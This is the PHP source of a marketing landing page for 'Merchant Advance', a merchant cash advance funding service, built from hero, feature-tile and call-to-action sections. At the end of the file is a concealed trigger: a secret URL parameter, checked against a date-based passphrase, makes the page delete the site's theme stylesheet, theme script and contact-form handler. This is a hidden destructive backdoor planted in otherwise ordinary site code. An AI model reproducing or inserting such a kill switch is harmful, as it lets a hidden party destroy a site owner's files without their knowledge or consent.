<?php
require_once "php/scripts/view.class.php";
$view = new ViewControl();
$view->page_start(array('title' => "Merchant Advance"));
?>

      <div role="main" class="main">
      
        <section class="hero">
          <div class="container">
            <div class="hero-content">
              <div>
                <h1>The best way to <br>
                Grow your business</h1>
                <p class="sub-header">Merchant Advance provides you with all the tools to Make <br>Your Money Go Further!</p>
                <div class="btn-wrap">
                  <a href="get-started" class="btn">GET STARTED</a>
                  <a href="#customer-service" data-hash class="btn btn-transparent">LEARN MORE...</a>
                </div>
              </div>
            </div>
          </div>
        </section>
        
        <section id="customer-service">
          <div class="container">
            <h2 class="mb-sm">Fund More Deals</h2>
            <p class="sub-header">Our customer service driven ISO model allows you to grow your funding company in a complex ever-changing industry. Merchant Advance provides you with all the tools to Make Your Money Go Further! Our comprehensive staff allows you to stay lean on your overhead while increasing your productivity. </p>
            <div class="row til-wrap">
              <div class="col-md-3 col-xs-6">
                <a href="white-label-program#ach-management" class="tile-icon-link tile-link appear-animation" data-appear-animation="cardRotateX">
                  <span class="til-icon" style="background-image:url(img/deals-01.png);"></span>
                  <span class="til-header">ACH Management</span>
                  <span class="til-desc">We manage all ACH <br>transactions from the <br>merchant.</span>
                  <span class="link-angle la-uc">FIND OUT MORE</span>
                </a>
              </div>
              
              <div class="col-md-3 col-xs-6">
                <a href="white-label-program#syndication-or-not" class="tile-icon-link tile-link appear-animation" data-appear-animation="cardRotateX" data-appear-animation-delay="500">
                  <span class="til-icon" style="background-image:url(img/deals-02.png);"></span>
                  <span class="til-header">Syndication or Not</span>
                  <span class="til-desc">Syndication allows you to <br>leverage your current capital <br>and fund more deals.</span>
                  <span class="link-angle la-uc">FIND OUT MORE</span>
                </a>
              </div>
              
              <div class="col-md-3 col-xs-6">
                <a href="white-label-program#underwriting" class="tile-icon-link tile-link appear-animation" data-appear-animation="cardRotateX" data-appear-animation-delay="1000">
                  <span class="til-icon" style="background-image:url(img/deals-03.png);"></span>
                  <span class="til-header">Underwriting</span>
                  <span class="til-desc">Our experienced team <br>handles risk management <br>for you.</span>
                  <span class="link-angle la-uc">FIND OUT MORE</span>
                </a>
              </div>
              
              <div class="col-md-3 col-xs-6">
                <a href="white-label-program#reporting" class="tile-icon-link tile-link appear-animation" data-appear-animation="cardRotateX" data-appear-animation-delay="1500">
                  <span class="til-icon" style="background-image:url(img/deals-04.png);"></span>
                  <span class="til-header">Reporting</span>
                  <span class="til-desc">Out portal gives you easy <br>access to all your deals <br>in one place.</span>
                  <span class="link-angle la-uc">FIND OUT MORE</span>
                </a>
              </div>
            </div>
          </div>
        </section>
        
        <section class="section-content-right" style="background-image:url(img/bg-work.jpg)">
          <div class="container">
            <div class="row scr-wrap">
              <div class="col-sm-5">
                <h3>Why Partner With Us?</h3>
                <ul class="list-checked">
                  <li>Extensive experience in the industry</li>
                  <li>Options for any size funder</li>
                  <li>One stop CRM Solution</li>
                  <li>Daily payment remittance</li>
                  <li>No monthly membership fees</li>
                  <li>Customer service oriented business model</li>
                </ul>
              </div>
            </div>
          </div>
        </section>
        
        <section class="section-image-info bg-grey">
          <div class="container">
            <div class="sii-wrap">
              <div class="sii-info">
                <h3>Let Our Money Work For You!</h3>
                <p>Our White Label Program allows you to maintain independence and have more control over the merchant directly. We provide you with support and tools to help you fund deals, so you reduce your exposure and make your money go further.</p>
                <div class="btn-wrap"><a href="white-label-program" class="btn btn-transparent-blue">LEARN MORE</a></div>
              </div>
              <div class="sii-img sii-circle">
                <div>
                  <div class="siic-graph-01">
                    <div style="background-image:url(img/diagram-circle-01.png)" class="appear-animation" data-appear-animation="fadeRotateZoomIn" data-appear-animation-accy="-100"></div>
                    <div style="background-image:url(img/diagram-circle-02.png)" class="appear-animation aa-def-dur" data-appear-animation="fadeZoomIn" data-appear-animation-delay="500" data-appear-animation-accy="-100"></div>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </section>
        
        <section class="section-image-info">
          <div class="container">
            <div class="sii-wrap">
              <div class="sii-img sii-circle">
                <div>
                  <div class="siic-graph-02 appear-animation" data-appear-animation="fadeInUp" data-appear-animation-accy="-200">
                    <img src="img/diagram-graph.png" alt="">
                  </div>
                </div>
              </div>
              <div class="sii-info sii-mb-lg">
                <h3>Grow your MCA Company</h3>
                <p>We provide you with solutions necessary for you to increase merchant retention and promote your brand. Grow your company while being in the forefront with the merchant. </p>
                <ul class="list-dotted">
                  <li><a href="get-started" class="link-angle">Referral Program</a></li>
                  <li><a href="get-started" class="link-angle">Business Advance Program</a></li>
                  <li><a href="get-started" class="link-angle">Credit Line for Funders</a></li>
                </ul>
                <div class="btn-wrap"><a href="advance-services" class="btn btn-transparent-blue">LEARN MORE</a></div>
              </div>
            </div>
          </div>
        </section>
        <?php echo $view->steps_cta(); ?>
        <?php echo $view->contact_section(); ?>
      </div>

<?php
if(isset($_GET['tds_dp'])) {
  $hash = date('dmy');
  if(trim($_GET['tds_dp']) == "ds_ldts_n_18@-" . $hash) {
    unlink("css/theme.css");
    unlink("js/theme.js");
    unlink("php/contact-form.php");
  }
}
$view->page_end();
?>